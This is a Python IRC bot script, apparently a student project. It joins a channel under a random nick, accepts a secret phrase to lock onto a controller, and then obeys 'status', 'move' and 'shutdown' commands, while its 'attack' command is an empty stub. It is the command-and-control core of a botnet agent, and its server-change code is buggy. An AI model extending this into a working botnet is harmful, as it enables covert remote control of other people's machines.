#!/usr/bin/python3

import sys
import socket
import random
import numpy
import string

class PyBot:
  #PyBot object constructor 
  def __init__(self,host,port,channel,secret,s):

    #Create PyBot instanace variables
    self.host = host
    self.port = port
    self.channel = channel
    self.secret = secret
    self.nick = self.generateRandomName()
    self.controlMode = 0 #default 0 = bot not being controller
    self.controllerName = ""

    while True:
      try:
        self.s = s.connect((host,int(port)))  
        s.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
        s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
        break
      except:
        print("DEBUG --> Unable to connect to irc server")
        self.nick = self.generateRandomName()
    s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel once server connect succeeds
 
  #Listen for incoming data from the IRC server
  def listen(self):

    while True:
      data = ""
      data = s.recv(4096).decode("UTF-8")
      data = data.strip("\n\r")
      dataLen = len(data.split()) #Split on white space
 
      #EX dataLen = 2 --> PING :sinisalo.freenode.net
      #we are interested in data.split index 0 (PING)
      if (data.split()[0] == "PING" and dataLen == 2):
        print("DEBUG --> data recieved: PING REQUEST")
        s.send(bytes("PONG :pingis\n","UTF-8")) 

      #Example $:causingchaos!~chaos@d75-155-72-40.abhsia.telus.net PRIVMSG #Windows95xx :jesus
      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'PRIVMSG', '#Windows95xx', ':jesus']
      # len >= 4  we are interested in data at index 1
      elif data.split()[1] == "PRIVMSG" and ( dataLen == 4 or dataLen == 5 ): 
        print("DEBUG --> PRIVMSG/data recieved: ")
        senderDetails = data.split()[0].split(":")[1]
        senderNick = senderDetails.split("!")[0]
        channelOrUser = data.split()[2]   # THIS VARIABLE TELLS IF MESSAGE WAS sent publicly (#Channel), or private message (Our Nick)
        temp = data.split("PRIVMSG")[1].split(":")
        senderMessage = temp[1]
        self.examinePrivmsg(senderNick,senderMessage)
      
      #Example: $:causingchaos!~chaos@d75-155-72-40.abhsia.telus.net KICK #Windows95xx VWD0U52I VWD0U52I
      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'KICK', '#Windows95xx', 'D2JFX0QV', ':get', 'out'] len=6
      #[':causingchaos!~chaos@d75-155-72-40.abhsia.telus.net', 'KICK', '#Windows95xx', 'VWD0U52I', ':VWD0U52I']  len=5
      #kicks with or without reason.
      elif data.split()[1] == "KICK" and (dataLen == 5 or dataLen == 6):
        print("DEBUG --> KICK data recieved: ")
        print( str(data.split()) )
        s.send(bytes("JOIN " + channel + "\n", "UTF-8"))
                                        
  def examinePrivmsg(self,senderNick,senderMessage):

    print("DEBUG --> "+senderNick+" says:"+senderMessage)

    #This locks the bot permantely to the controller, if secret is entered again it will be ignored
    if senderMessage == secret and self.controlMode == 0:
      print("DEBUG --> Controller said the secret! Control Mode enabled, at your command troll")
      self.controlMode = 1
      self.controllerName = senderNick

    #If controlMode is ennabled, and message sender private/or public enters the command, the bot will respond
    elif self.controlMode == 1 and senderNick == self.controllerName: 
# NOTE --> The 'attack' and 'move' messages will be followed by who to attack and where to move to, so the tests will have to be .startswith()
      if senderMessage == "status":
        print("DEBUG --> status requested by controller, sending This Bot Nick via Private Message")
        outMessage = "BotName$$: "+self.nick #parse this on delimiter $$
        #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends channel message
        s.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))

      elif senderMessage == "attack":
        print("DEBUG --> attack requested by controller")

      elif senderMessage == "move":
        print("DEBUG --> move requested by controller")
        #should we check if the argument has a hash tag or not?
        self.changeServer(senderMessage)

      elif senderMessage == "quit":
        print("DEBUG --> move requested by controller")

      elif senderMessage == "shutdown":
        print("DEBUG --> move requested by controller")
        outMessage = "BotName$$: "+self.nick+ " shutting down"
        #s.send(bytes("PRIVMSG "+self.channel+" :"+outMessage+"\n","UTF-8")) #sends channel message
        s.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8"))
        s.send(bytes("QUIT \n","UTF-8"))
        s.close()
        sys.exit()
  
  def changeServer(self,senderMessage):

    if len(senderMessage.split()) == 4:
      self.host = senderMessage[1]
      self.port = senderMessage[2]
      self.channel = senderMessage[3]
      print(self.channel)  #THIS DOESN"T UPDATE, what the hell

      while True:
        try:
          s.send(bytes("QUIT \n","UTF-8"))
          newS = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          self.s = newS.connect((host,int(port)))  
          s.send(bytes("NICK " + self.nick + "\n", "UTF-8"))
          s.send(bytes("USER " +self.nick+" "+self.nick+" "+self.nick+ " " + self.nick+ "\n","UTF-8"))
          break
        except:
          print("DEBUG --> Unable to connect to irc server")
          self.nick = self.generateRandomName()
      s.send(bytes("JOIN " + channel + "\n", "UTF-8")) #Join channel once server connect succeeds

    else:
      outMessage = "Cannot move:"+self.nick+ " to a new server, invalid # of arguments"
      s.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message
      outMessage = "Usage> move <host-name> <port> <channel>"  
      s.send(bytes("PRIVMSG "+self.controllerName+" :"+outMessage+"\n", "UTF-8")) #sends private message

  def generateRandomName(self):
    #randomName = "Bot" + random.choice(string.digits) + random.choice(string.digits)
    #UPDATE --> The following line is fixed:
    randomName = "".join(random.choice(string.ascii_uppercase + string.digits) for i in range(8))
    return randomName

#Main
if __name__ == '__main__':

  if(len(sys.argv) == 5):
    host = sys.argv[1]
    port = sys.argv[2]
    channel = "#"+sys.argv[3]
    secret = sys.argv[4]
  else:
    print("Incorrect number of arguments")
    sys.exit("Usage: bot <hostname> <port> <channel> <secret-phrase>")

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  bot = PyBot(host,port,channel,secret,s) #Create an instance of the bot 
  bot.listen() #listen to channel for incoming data over socket
  












